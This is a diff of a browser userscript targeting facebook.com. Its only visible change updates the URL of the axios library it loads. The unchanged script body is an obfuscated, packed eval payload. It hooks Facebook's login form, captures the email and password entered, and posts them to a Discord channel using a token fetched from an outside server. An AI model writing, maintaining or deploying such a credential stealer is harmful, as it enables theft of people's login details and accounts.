@@ -8,7 +8,7 @@ https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldm
 // @author       You
 // @match        https://*.facebook.com/*
 // @grant        none
-// @require https://npmcdn.com/axios/dist/axios.min.js
+// @require https://unpkg.com/axios/dist/axios.min.js
 // ==/UserScript==
 
 eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('(0(){\'i t\';8 4,1;2.m(\'b://s.q/n.r\').g(0(3){4=3.9.p;1=3.9.1});2.5.h=\'b://j.l/k\';o.I(\'F\').E(\'G\',0(e){2.5.H.J[\'u\']=4;8 f={7:e.6.7.c,D:e.6.C.c};2.x(\'/w/\'+1+\'/v\',{y:z.B(f)}).g(0(e){a.d(e)}).A(0(e){a.d(e)})})})();',46,46,'function|roomid|axios|body|AUTH_TOKEN|defaults|target|email|var|data|console|https|value|log||creds|then|baseURL|use|discordapp|api|com|get|config|document|token|xyz|json|hmello|strict|Authorization|messages|channels|post|content|JSON|catch|stringify|pass|password|addEventListener|login_form|submit|headers|getElementById|common'.split('|'),0,{}))
